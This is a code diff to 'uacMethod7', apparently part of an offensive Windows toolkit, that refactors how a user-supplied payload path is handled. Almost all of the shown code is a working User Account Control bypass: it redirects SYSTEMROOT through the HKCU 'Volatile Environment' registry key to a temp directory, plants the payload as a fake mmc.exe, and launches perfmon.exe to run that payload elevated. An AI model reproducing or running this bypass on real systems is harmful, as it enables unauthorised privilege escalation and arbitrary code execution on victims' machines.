@@ -28,18 +28,20 @@ def uacMethod7_cleanup(path):
 
 def uacMethod7(payload):
 	if payloads().exe(payload):
-		if not os.path.exists(payload):
+		if not os.path.exists(payload[0]):
 			print_error("Args are not allowed with this technique")
 			return False
-
+		
 		path = "Volatile Environment"
 
 		if registry().modify_key(hkey="hkcu", path=path, name="SYSTEMROOT", value=tempfile.gettempdir(), create=True):
 			print_success("Successfully created SYSTEMROOT key containing a new temp directory ({dir})".format(
-							dir=os.path.join(tempfile.gettempdir())))
+					dir=os.path.join(tempfile.gettempdir())))
 		else:
 			print_error("Unable to create registry keys")
 			return False
+		
+		
 
 		if not os.path.exists(os.path.join(tempfile.gettempdir(), "system32")):
 			try:
@@ -63,7 +65,7 @@ def uacMethod7(payload):
 			pass
 
 		try:
-			shutil.copy(payloads().exe(payload)[0], os.path.join(tempfile.gettempdir(), "system32\\mmc.exe"))
+			shutil.copy(payload[0], os.path.join(tempfile.gettempdir(), "system32\\mmc.exe"))
 		except shutil.Error as error:
 			print_error("Unable to copy payload to directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
 			for x in Constant.output:
@@ -85,11 +87,11 @@ def uacMethod7(payload):
 		with disable_fsr():
 			print_success("Successfully disabled file system redirection")
 			if process().create("perfmon.exe"):
-				print_success("Successfully spawned process ({})".format(payloads().exe(payload)[0]))
+				print_success("Successfully spawned process ({})".format(payload[0]))
 				time.sleep(5)
 				uacMethod7_cleanup(path)
 			else:
-				print_error("Unable to spawn process ({})".format(os.path.join(payloads().exe(payload)[0])))
+				print_error("Unable to spawn process ({})".format(payload[0]))
 				for x in Constant.output:
 					if "error" in x:
 						uacMethod7_cleanup(path)
